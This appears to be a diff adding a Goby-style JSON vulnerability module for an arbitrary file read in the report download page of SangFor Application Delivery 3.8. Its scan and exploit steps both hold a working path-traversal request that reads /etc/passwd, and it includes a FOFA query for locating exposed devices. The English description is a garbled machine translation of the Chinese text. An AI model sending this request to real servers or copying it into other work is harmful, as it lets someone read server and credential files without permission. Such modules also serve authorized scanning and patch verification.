@@ -1,0 +1,148 @@
+{
+  "Name": "SangFor Application Delivery Arbitrary File Download",
+  "Description": "<p>Deeply convincing application delivery can provide users with comprehensive solutions including multi-data center load balancing, multi-link load balancing and server load balancing. It not only realizes the real-time monitoring of each data center's status, connection and server, but also allocates users' access requests to the corresponding data center, link to the server according to preset rules, so as to realize the reasonable allocation of data flow and make full use of all data center, link and server. 3.8 / Report/Download. HP files have an arbitrary file reading vulnerability, through which an attacker can download any file in the server and leak sensitive server information<br></p>",
+  "Product": "SangFor Application Delivery",
+  "Homepage": "https://www.sangfor.com.cn/product-and-solution/sangfor-its/5",
+  "DisclosureDate": "2022-03-23",
+  "Author": "1171373465@qq.com",
+  "FofaQuery": "title=\"ad.sangfor.com\"",
+  "GobyQuery": "title=\"ad.sangfor.com\"",
+  "Level": "2",
+  "Impact": "<p>There is an arbitrary file reading vulnerability in the download.&nbsp;<br></p>",
+  "Recommendation": "<p>Vendor has released leaks fixes, please pay attention to update: <a href=\"https://www.sangfor.com.cn\">https://www.sangfor.com.cn</a><br></p>",
+  "References": [
+    "https://fofa.so"
+  ],
+  "Is0day": false,
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "File",
+      "type": "input",
+      "value": "../../../../../etc/passwd"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/report/download.php?pdf=../../../../../etc/passwd",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "root:",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/report/download.php?pdf=../../../../../etc/passwd",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "root:",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "Tags": [
+    "任意⽂件下载"
+  ],
+  "VulType": [
+    "任意⽂件下载"
+  ],
+  "CVEIDs": [
+    ""
+  ],
+  "CNNVD": [
+    ""
+  ],
+  "CNVD": [
+    ""
+  ],
+  "CVSSScore": "7.0",
+  "Translation": {
+    "CN": {
+      "Name": "深信服 应用交付报表系统 download.php 任意文件读取漏洞",
+      "Product": "深信服 应用交付报表系统",
+      "Description": "<p>深信服应用交付 AD 能够为用户提供包括多数据中心负载均衡、多链路负载均衡、服务器负载均衡的全方位解决方案。不仅实现对各个数据中心、链路以及服务器状态的实时监控，同时根据预设规则，将用户的访问请求分配给相应的数据中心、 链路以及服务器，进而实现数据流的合理分配，使所有的数据中心、链路和服务器都得到充分利用。其中3.8版本/report/download.php 文件存在任意文件读取漏洞，攻击者通过漏洞可以下载服务器中的任意文件，泄漏服务器敏感信息<br></p>",
+      "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：&nbsp;<a href=\"https://www.sangfor.com.cn\">https://www.sangfor.com.cn</a><br></p>",
+      "Impact": "<p><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">攻击者通过漏洞可以下载服务器任意文件</span><br></p>",
+      "VulType": [
+        "任意⽂件下载"
+      ],
+      "Tags": [
+        "任意⽂件下载"
+      ]
+    },
+    "EN": {
+      "Name": "SangFor Application Delivery Arbitrary File Download",
+      "Product": "SangFor Application Delivery",
+      "Description": "<p>Deeply convincing application delivery can provide users with comprehensive solutions including multi-data center load balancing, multi-link load balancing and server load balancing. It not only realizes the real-time monitoring of each data center's status, connection and server, but also allocates users' access requests to the corresponding data center, link to the server according to preset rules, so as to realize the reasonable allocation of data flow and make full use of all data center, link and server. 3.8 / Report/Download. HP files have an arbitrary file reading vulnerability, through which an attacker can download any file in the server and leak sensitive server information<br></p>",
+      "Recommendation": "<p>Vendor has released leaks fixes, please pay attention to update: <a href=\"https://www.sangfor.com.cn\">https://www.sangfor.com.cn</a><br></p>",
+      "Impact": "<p>There is an arbitrary file reading vulnerability in the download.&nbsp;<br></p>",
+      "VulType": [
+        "Arbitrary File Download"
+      ],
+      "Tags": [
+        "Arbitrary File Download"
+      ]
+    }
+  },
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
